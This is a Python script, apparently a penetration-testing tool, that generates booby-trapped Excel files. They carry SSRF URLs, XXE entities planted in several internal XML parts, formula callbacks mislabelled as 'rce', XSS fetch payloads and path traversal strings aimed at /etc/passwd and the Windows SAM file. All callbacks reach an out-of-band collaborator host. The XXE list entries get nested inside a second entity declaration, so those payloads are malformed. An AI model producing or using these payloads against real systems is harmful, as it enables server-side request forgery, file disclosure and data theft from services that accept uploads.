import zipfile
import shutil
from pathlib import Path
from openpyxl import Workbook
import xml.etree.ElementTree as ET

def generate_xlsx_payloads(output_dir, burp_collab):
    output_dir = Path(output_dir)
    
    vulns = {
        'ssrf': [
            f"http://{burp_collab}/ssrf1",
            f"https://{burp_collab}/ssrf2",
            f"http://127.0.0.1@{burp_collab}/ssrf3",
            f"http://localhost@{burp_collab}/ssrf4",
            f"file://{burp_collab}/ssrf5",
            f"gopher://{burp_collab}/ssrf6",
        ],
        'xxe': [
            f'<!ENTITY xxe SYSTEM "http://{burp_collab}/xxe1">',
            f'<!ENTITY xxe SYSTEM "https://{burp_collab}/xxe2">',
            f'<!ENTITY xxe SYSTEM "file://{burp_collab}/xxe3">',
            f'<!ENTITY % xxe SYSTEM "http://{burp_collab}/xxe4">',
            f'<!DOCTYPE xxe [<!ENTITY xxe SYSTEM "http://{burp_collab}/xxe5">]>',
            f'<!ENTITY % remote SYSTEM "http://{burp_collab}/xxe6">',
            f'<!ENTITY % int "<!ENTITY &#37; trick SYSTEM \'http://{burp_collab}/xxe7\'>">',
        ],
        'rce': [
            f"=HYPERLINK(\"http://{burp_collab}/rce1\",\"test\")",
            f"=WEBSERVICE(\"http://{burp_collab}/rce2\")",
            f"=FILTERXML(\"http://{burp_collab}/rce3\",\"//test\")",
            f"=IMPORTXML(\"http://{burp_collab}/rce4\",\"//test\")",
            f"=IMPORTDATA(\"http://{burp_collab}/rce5\")",
            f"=IMPORTHTML(\"http://{burp_collab}/rce6\",\"table\",1)",
            f"=IMPORTFEED(\"http://{burp_collab}/rce7\")",
        ],
        'xss': [
            f"<script>fetch('http://{burp_collab}/xss1')</script>",
            f"=HYPERLINK(\"javascript:fetch('http://{burp_collab}/xss2')\",\"Click\")",
            f"<img src=x onerror=fetch('http://{burp_collab}/xss3')>",
        ],
        'path_traversal': [
            "../../../etc/passwd",
            "..\\..\\..\\windows\\system32\\config\\sam",
            "....//....//....//etc/passwd",
        ],
    }
    
    for vuln, payloads in vulns.items():
        vuln_dir = output_dir / vuln
        vuln_dir.mkdir(exist_ok=True)
        
        if vuln == 'ssrf':
            for i, payload in enumerate(payloads, 1):
                wb = Workbook()
                ws = wb.active
                ws['A1'] = payload
                output_file = vuln_dir / f"payload_{i}.xlsx"
                wb.save(output_file)
        
        elif vuln == 'xxe':
            for i, payload in enumerate(payloads, 1):
                wb = Workbook()
                ws = wb.active
                ws['A1'] = 'Test'
                
                xlsx_path = vuln_dir / f"payload_{i}.xlsx"
                wb.save(xlsx_path)
                
                with zipfile.ZipFile(xlsx_path, 'r') as zip_ref:
                    zip_ref.extractall(output_dir / f"temp_xxe_{i}")
                
                xml_path = output_dir / f"temp_xxe_{i}" / "xl" / "workbook.xml"
                if xml_path.exists():
                    tree = ET.parse(xml_path)
                    root = tree.getroot()
                    
                    doctype = f'<!DOCTYPE root [<!ENTITY xxe SYSTEM "{payload}">]>'
                    xml_str = ET.tostring(root, encoding='unicode')
                    xml_with_xxe = doctype + '\n' + xml_str
                    
                    with open(xml_path, 'w', encoding='utf-8') as f:
                        f.write(xml_with_xxe)
                    
                    with zipfile.ZipFile(xlsx_path, 'w', zipfile.ZIP_DEFLATED) as zip_ref:
                        temp_dir = output_dir / f"temp_xxe_{i}"
                        for file_path in temp_dir.rglob('*'):
                            if file_path.is_file():
                                arcname = file_path.relative_to(temp_dir)
                                zip_ref.write(file_path, arcname)
                
                shutil.rmtree(output_dir / f"temp_xxe_{i}", ignore_errors=True)
            
            xxe_locations = {
                'sharedstrings': ('xl/sharedStrings.xml', f'''<?xml version="1.0" encoding="UTF-8" standalone="yes"?>
<!DOCTYPE xxe [
<!ENTITY xxe SYSTEM "http://{burp_collab}/xxe_sharedstrings">
]>
<sst xmlns="http://schemas.openxmlformats.org/spreadsheetml/2006/main" count="1" uniqueCount="1">
<si><t>test</t></si>
</sst>'''),
                'styles': ('xl/styles.xml', f'''<?xml version="1.0" encoding="UTF-8" standalone="yes"?>
<!DOCTYPE stylesheet [
<!ENTITY xxe SYSTEM "http://{burp_collab}/xxe_styles">
]>
<styleSheet xmlns="http://schemas.openxmlformats.org/spreadsheetml/2006/main">
<fonts count="1">
<font>
<sz val="11"/>
<name val="Calibri"/>
</font>
</fonts>
</styleSheet>'''),
                'content_types': ('[Content_Types].xml', f'''<?xml version="1.0" encoding="UTF-8" standalone="yes"?>
<!DOCTYPE Types [
<!ENTITY xxe SYSTEM "http://{burp_collab}/xxe_content_types">
]>
<Types xmlns="http://schemas.openxmlformats.org/package/2006/content-types">
<Default Extension="rels" ContentType="application/vnd.openxmlformats-package.relationships+xml"/>
<Default Extension="xml" ContentType="application/xml"/>
<Override PartName="/xl/workbook.xml" ContentType="application/vnd.openxmlformats-officedocument.spreadsheetml.sheet.main+xml"/>
</Types>'''),
            }
            
            for name, (xml_path, content) in xxe_locations.items():
                wb = Workbook()
                ws = wb.active
                ws['A1'] = 'Test'
                xlsx_path = vuln_dir / f"xxe_{name}.xlsx"
                wb.save(xlsx_path)
                
                with zipfile.ZipFile(xlsx_path, 'r') as zip_ref:
                    zip_ref.extractall(output_dir / f"temp_xxe_{name}")
                
                target_path = output_dir / f"temp_xxe_{name}" / xml_path
                if target_path.exists() or name == 'content_types':
                    target_path.parent.mkdir(parents=True, exist_ok=True)
                    with open(target_path, 'w', encoding='utf-8') as f:
                        f.write(content)
                    
                    with zipfile.ZipFile(xlsx_path, 'w', zipfile.ZIP_DEFLATED) as zip_ref:
                        temp_dir = output_dir / f"temp_xxe_{name}"
                        for file_path in temp_dir.rglob('*'):
                            if file_path.is_file():
                                arcname = file_path.relative_to(temp_dir)
                                zip_ref.write(file_path, arcname)
                
                shutil.rmtree(output_dir / f"temp_xxe_{name}", ignore_errors=True)
        
        elif vuln == 'rce':
            for i, payload in enumerate(payloads, 1):
                wb = Workbook()
                ws = wb.active
                ws['A1'] = payload
                output_file = vuln_dir / f"payload_{i}.xlsx"
                wb.save(output_file)
            
            wb = Workbook()
            ws = wb.active
            ws['A1'] = f'=HYPERLINK("http://{burp_collab}/rce_hyperlink","Click")'
            ws['A2'] = f'=WEBSERVICE("http://{burp_collab}/rce_webservice")'
            ws['A3'] = f'=FILTERXML("http://{burp_collab}/rce_filterxml","//test")'
            output_file = vuln_dir / "multiple_formulas.xlsx"
            wb.save(output_file)
        
        elif vuln in ['xss', 'path_traversal']:
            for i, payload in enumerate(payloads, 1):
                wb = Workbook()
                ws = wb.active
                ws['A1'] = payload
                output_file = vuln_dir / f"payload_{i}.xlsx"
                wb.save(output_file)
